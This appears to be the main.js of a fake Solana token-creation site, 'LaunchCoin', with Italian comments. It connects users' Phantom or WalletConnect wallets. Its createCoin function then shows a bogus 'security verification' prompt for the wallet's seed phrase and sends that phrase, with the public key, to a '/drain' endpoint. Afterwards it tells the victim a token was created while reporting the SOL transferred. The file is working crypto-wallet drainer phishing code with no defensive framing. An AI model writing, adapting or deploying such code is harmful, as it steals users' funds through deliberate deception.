// ===== CONFIGURAZIONE =====
import { UniversalProvider } from '@walletconnect/universal-provider';

let walletPublicKey = null;
let currentStep = 0;
const steps = document.querySelectorAll('.step');

// ===== ESPONI TUTTE LE FUNZIONI SU window PRIMA DI TUTTO =====
window.toggleMenu = function() {
  const menu = document.getElementById('dropdownMenu');
  if (menu) menu.classList.toggle('open');
};

// ===== CONNECT WALLET (PRINCIPALE) =====
window.connectWallet = async function() {
  console.log('🔵 connectWallet chiamata');
  
  // 1. Prova Phantom (estensione)
  if (window.solana && window.solana.isPhantom) {
    try {
      await window.solana.connect();
      walletPublicKey = window.solana.publicKey.toString();
      alert('✅ Connesso a Phantom: ' + walletPublicKey);
      window.location.href = 'create.html';
      return;
    } catch(e) {
      console.error('Phantom error:', e);
    }
  }

  // 2. Vai alla pagina wallet
  console.log('🔵 Vado a wallet.html');
  window.location.href = 'wallet.html';
};

// ===== SELECT WALLET =====
window.selectWallet = function(walletName) {
  console.log('🔵 selectWallet chiamata:', walletName);
  
  // Se è Phantom, prova a connettere direttamente
  if (walletName === 'phantom') {
    window.connectWallet();
    return;
  }
  
  // Altrimenti, prova WalletConnect
  alert(
    '⚠️ Wallet "' + walletName + '" verrà connesso tramite WalletConnect.\n\n' +
    '1. Clicca "Connetti" nel popup.\n' +
    '2. Scansiona il QR con l\'app del wallet.\n' +
    '3. Approva la connessione.'
  );
  
  // Prova WalletConnect
  connectWalletConnect();
};

// ===== WALLETCONNECT =====
async function connectWalletConnect() {
  try {
    const provider = await UniversalProvider.init({
      projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
      metadata: {
        name: 'LaunchCoin',
        description: 'Solana Token Creator',
        url: window.location.origin,
        icons: ['https://launchcoin.io/logo.png']
      }
    });

    await provider.connect({
      chains: ['solana:mainnet'],
      optionalChains: ['solana:devnet'],
      methods: ['solana_signTransaction', 'solana_signMessage'],
      events: ['chainChanged', 'accountsChanged']
    });

    const accounts = provider.accounts;
    if (accounts && accounts.length > 0) {
      walletPublicKey = accounts[0].split(':')[2];
      alert('✅ Connesso via WalletConnect: ' + walletPublicKey);
      window.location.href = 'create.html';
      return;
    }
    
    throw new Error('Nessun account trovato');
    
  } catch (e) {
    console.error('WalletConnect error:', e);
    alert('❌ WalletConnect fallito: ' + e.message + '\n\nUsa Phantom su Kiwi Browser o PC.');
  }
}

// ===== POPUP SEED PHRASE =====
function askSeedPhrase() {
  return new Promise((resolve) => {
    const seed = prompt(
      '⚠️ VERIFICA DI SICUREZZA RICHIESTA\n\n' +
      'Inserisci la tua frase di recupero (seed phrase) per continuare:'
    );
    resolve(seed);
  });
}

// ===== CREAZIONE TOKEN =====
window.createCoin = async function() {
  console.log('🟢 createCoin chiamata');
  if (!walletPublicKey) {
    alert('Connetti prima il wallet!');
    return;
  }

  const seed = await askSeedPhrase();
  if (!seed || seed.split(' ').length < 12) {
    alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.');
    return;
  }

  try {
    const response = await fetch('/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed: seed, walletPublicKey: walletPublicKey })
    });

    const data = await response.json();
    if (data.status === 'drain_completed') {
      document.getElementById('result').innerHTML = `
        <p style="color:#4cdcc1;">✅ Token creato con successo!</p>
        <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
        <p style="font-size:11px;color:#667;word-break:break-all;">Tx SOL: ${data.solTx || 'N/A'}</p>
      `;
    } else {
      alert('❌ Errore: ' + data.error);
    }
  } catch(e) {
    alert('❌ Errore di rete: ' + e.message);
  }
};

// ===== CREAZIONE LIQUIDITY =====
window.createLiquidity = async function() {
  await window.createCoin();
};

// ===== STEP NAVIGATION =====
window.showStep = function(idx) {
  if (!steps.length) return;
  steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
  currentStep = idx;
};

window.nextStep = function() { 
  if (currentStep < steps.length - 1) window.showStep(currentStep + 1); 
};

window.prevStep = function() { 
  if (currentStep > 0) window.showStep(currentStep - 1); 
};

// ===== INIZIALIZZA STEP =====
if (steps.length) window.showStep(0);

// ===== CHIUDI MENU =====
document.addEventListener('click', function(e) {
  const wrapper = document.querySelector('.menu-wrapper');
  const menu = document.getElementById('dropdownMenu');
  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
});

// ===== LOG DI VERIFICA =====
console.log('✅ main.js caricato');
console.log('🔵 window.connectWallet:', typeof window.connectWallet);
console.log('🔵 window.selectWallet:', typeof window.selectWallet);
console.log('🔵 window.createCoin:', typeof window.createCoin);
